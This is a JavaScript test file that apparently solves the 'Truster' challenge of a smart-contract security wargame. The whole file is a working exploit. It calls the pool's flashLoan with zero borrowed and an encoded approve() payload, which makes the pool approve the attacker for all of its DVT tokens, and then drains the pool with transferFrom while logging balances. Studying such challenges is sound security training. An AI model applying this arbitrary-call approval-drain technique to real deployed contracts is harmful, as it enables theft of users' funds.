/**
 * Exploit for the Truster vulnerability
 * 
 * This exploitation uses the ability to execute an arbitrary call
 * via the flashLoan function to have the attacker approved to spend
 * all of the pool's tokens, then steal them with transferFrom.
 */

it('Exploit', async function () {
    console.log('Initial pool balance:', (await this.token.balanceOf(this.pool.address)).toString());
    console.log('Initial attacker balance:', (await this.token.balanceOf(attacker)).toString());
    
    // 1. Encode the call to approve(attacker, TOKENS_IN_POOL)
    const approvePayload = this.token.contract.methods.approve(
        attacker, 
        TOKENS_IN_POOL.toString()
    ).encodeABI();

    // 2. Execute the flash loan with a borrow of 0 DVT
    await this.pool.flashLoan(
        0, // Borrowed amount = 0
        attacker, // Borrower address (can be any address)
        this.token.address, // DVT contract to call
        approvePayload, // Data: approve(attacker, 1M DVT)
        { from: attacker }
    );

    console.log('Allowance after flashLoan:', 
        (await this.token.allowance(this.pool.address, attacker)).toString());
    
    // 3. Transfer the approved tokens out of the pool
    await this.token.transferFrom(
        this.pool.address,
        attacker,
        TOKENS_IN_POOL,
        { from: attacker }
    );
    
    console.log('Final pool balance:', (await this.token.balanceOf(this.pool.address)).toString());
    console.log('Final attacker balance:', (await this.token.balanceOf(attacker)).toString());
});